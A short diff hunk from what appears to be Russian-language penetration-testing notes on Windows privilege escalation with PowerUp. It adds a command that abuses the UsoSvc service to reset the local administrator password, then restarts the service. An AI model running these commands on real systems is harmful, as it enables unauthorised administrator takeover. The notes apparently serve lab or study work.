@@ -130,6 +130,8 @@ Invoke-AllChecks
 
 invoke-ServiceAbuse -Name 'UsoSvc' ---- злоупотребление службой (запуск и изменение)
 
+Invoke-ServiceAbuse -Name 'UsoSvc' -command 'net user administrator Password123!'
+
 Restart-service 'UsoSVC'
 
 # Запуск процесса от имени другого пользователя (администратора)
